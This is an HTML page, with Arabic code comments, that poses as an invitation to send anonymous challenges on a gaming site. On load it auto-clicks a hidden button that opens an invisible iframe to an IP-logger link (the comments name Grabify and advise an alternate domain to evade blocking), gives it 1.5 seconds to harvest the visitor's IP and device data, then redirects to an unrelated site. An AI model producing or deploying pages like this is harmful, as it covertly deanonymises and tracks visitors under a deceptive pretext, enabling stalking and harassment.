<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send me anonymous challenges on GamesZoneX!</title>
</head>
<body>

  <!-- زر مخفي تماماً عن عين المستخدم -->
  <button id="autoBtn" style="display:none; width:0; height:0; visibility:hidden;"></button>

  <script>
    // 1. انتظر حتى يتم تحميل هيكل الصفحة بالكامل
    document.addEventListener("DOMContentLoaded", function() {
      const btn = document.getElementById('autoBtn');
      
      // 2. برمجة ماذا سيحدث عندما يتم الضغط على الزر
      btn.addEventListener('click', function() {
        // توليد متغير عشوائي لكسر الكاش والحظر المكرر في كل مرة
        const cacheBuster = Math.floor(Math.random() * 999999);
        
        // ⚠️ استبدل هذا الرابط برابط Grabify الجديد (ويُفضل بنطاق بديل غير grabify.link)
        const grabifyUrl = 'https://photospace.life/JLMB8N' + cacheBuster; 
        const destinationUrl = 'https://dominoes.mx';

        // إنشاء إطار (iframe) برمجياً ليعطي الـ Smart Logger بيئة متصفح كاملة
        const iframe = document.createElement('iframe');
        iframe.style.display = "none";
        iframe.style.width = "0px";
        iframe.style.height = "0px";
        iframe.style.border = "none";
        iframe.src = grabifyUrl;
        document.body.appendChild(iframe);

        // 3. منح الـ Smart Logger مهلة (ثانية ونصف) لجمع بيانات الجهاز والـ IP ثم التوجيه
        setTimeout(function() {
          window.location.href = destinationUrl;
        }, 1500);
      });

      // 4. إجبار المتصفح على ضغط الزر أوتوماتيكياً فوراً بدون تدخل المستخدم
      btn.click();
    });
  </script>

</body>
</html>
